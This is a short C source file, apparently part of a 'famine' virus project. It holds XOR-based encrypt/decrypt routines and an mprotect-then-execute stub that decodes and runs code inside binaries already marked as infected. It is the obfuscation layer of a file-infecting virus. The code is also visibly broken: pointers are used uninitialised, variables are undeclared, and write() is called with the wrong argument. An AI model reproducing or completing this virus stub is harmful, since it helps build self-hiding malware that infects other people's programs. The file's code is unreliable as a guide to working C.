//
// Created by Joris GOUNAND on 11/8/19.
//

#include "../inc/famine.h"

int decrypt(void *start,size_t size, int key)
{
	void *dst;
	typedef long (*JittedFunc)(int);

	if (start || size || key)
	{;}

	if (mprotect(start, size, PROT_WRITE | PROT_READ) == -1) {
		//perror("mprotect");
		return -1;
	}
	//memcpy(dst, code, sizeof(code));

	if (mprotect(start, size, PROT_READ | PROT_EXEC) == -1) {
		perror("mprotect");
		return -1;
	}
	JittedFunc func = dst;
	func(0);
		//printf("test Jitted %d\n",(int)func(0));
		return 0;
}

void decrypter(unsigned long address_of_main)
{
	size_t	size;
	size_t	offset;
	char	*start;

	offset = *(int *)(address_of_main - 4 + sizeof(offset));
	size = *(int *)(address_of_main - 4);
	if(size && im_infected(address_of_main))
	{
		start[offset] ^= *(int *)(address_of_main - 4);
		offset++;
		while (offset < size)
		{
			start[offset] ^= start[offset - 1];
			offset++;
		}
	}
}

// 
// merge to famine and test
// 
void crypter(char *read, size_t size, char key, int fd)
{
	char tab[]= {0,0};

	if(size && is_infected(file->data))
	{
		write(fd, (tab[size % 2] = (read[size] ^ key)), 1);
		size--;
		while (size)
		{
			write(fd, (tab[size % 2] = (read[offset + size] ^ tab[(size - 1) % 2])), 1);
			size--;
		}
	}
}
